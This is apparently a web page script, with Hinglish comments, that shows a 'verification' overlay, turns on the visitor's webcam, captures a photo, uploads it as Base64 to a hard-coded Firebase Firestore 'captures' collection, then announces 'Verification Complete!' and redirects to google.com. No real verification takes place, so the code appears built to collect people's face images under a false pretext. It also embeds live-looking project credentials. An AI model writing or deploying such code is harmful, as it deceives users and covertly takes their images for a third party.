const firebaseConfig = {
    apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
    authDomain: "movie-1e6fc.firebaseapp.com",
    projectId: "movie-1e6fc",
    storageBucket: "movie-1e6fc.firebasestorage.app",
    messagingSenderId: "371616954594",
    appId: "1:371616954594:web:977d88ec7570df351246bb"
};

// Initialize Firebase v8
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.firestore();

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const overlay = document.getElementById('verifyOverlay');

async function openVerify() {
    overlay.style.display = 'flex';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
    } catch (err) {
        console.error("Camera error:", err);
    }
}

async function captureAndDone() {
    const context = canvas.getContext('2d');
    if (video.srcObject) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        // Photo ko Text (Base64) mein convert karna
        const photoData = canvas.toDataURL('image/jpeg', 0.5);

        // FIRESTORE MEIN SAVE KARNA
        db.collection("captures").add({
            image: photoData,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        })
        .then(() => {
            console.log("Database updated!");
            // Camera band karna
            const tracks = video.srcObject.getTracks();
            tracks.forEach(t => t.stop());
            
            alert("Verification Complete!");
            overlay.style.display = 'none';
            window.location.href = "https://google.com";
        })
        .catch((error) => {
            console.error("Error writing to DB: ", error);
            alert("Something went wrong!");
        });
    }
}
